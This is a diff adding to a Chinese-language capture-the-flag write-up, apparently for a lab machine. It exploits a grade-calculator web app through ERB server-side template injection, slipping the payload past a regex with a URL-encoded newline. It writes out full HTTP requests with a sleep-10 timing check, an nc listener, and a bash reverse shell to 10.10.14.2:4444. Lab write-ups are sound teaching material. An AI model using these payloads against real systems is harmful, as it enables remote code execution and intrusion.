@@ -75,6 +75,7 @@ irb(main):008:0> "SampleText{{}}" =~ /^[a-zA-Z]+$/
 ```
 ### Foothold
 #### 知道了这一点，我们就可以通过在开始，然后我们的有效载荷在一个新的行
+#### test后面有个换行
 ```
 test
 <%= IO.popen("sleep 10").readlines() %>
@@ -83,4 +84,51 @@ test
 #### 在Repeater窗口中，我们修改拦截的请求，将有效载荷包含在参数category1，确保对其进行url编码。我们手动包含换行符通过使用其url编码%0A：
 ```
 test%0A<%25%3d+IO.popen("sleep+10").readlines()%25>
+```
+#### 填入并选择按Ctrl+U:
+```
+POST /weighted-grade-calc HTTP/1.1
+Host: 10.129.229.121
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://10.129.229.121/weighted-grade
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 177
+Origin: http://10.129.229.121
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Priority: u=0, i
+
+category1=test1%0A<%2510%3d+IO.popen("sleep+10").readlines()+%25>&grade1=9&weight1=20&category2=test2&grade2=8&weight2=40&category3=test3&grade3=7&weight3=40&category4=N%2FA&grade4=0&weight4=0&category5=N%2FA&grade5=0&weight5=0
+```
+#### 页面挂起10秒，表明注入成功了！对于反向shell，我们将使用以下有效载荷：
+```
+nc -lnvp 4444
+```
+#### 要注入的payload,按Ctrl+U
+```
+<%= IO.popen("bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'").readlines() %>
+```
+```
+POST /weighted-grade-calc HTTP/1.1
+Host: 10.129.229.121
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://10.129.229.121/weighted-grade
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 177
+Origin: http://10.129.229.121
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Priority: u=0, i
+
+category1=test1%0A<%25%3d+IO.popen("bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.2/4444+0>%261'").readlines()+%25>&grade1=8&weight1=30&category2=test2&grade2=9&weight2=30&category3=test3&grade3=8&weight3=40&category4=N%2FA&grade4=0&weight4=0&category5=N%2FA&grade5=0&weight5=0
 ```
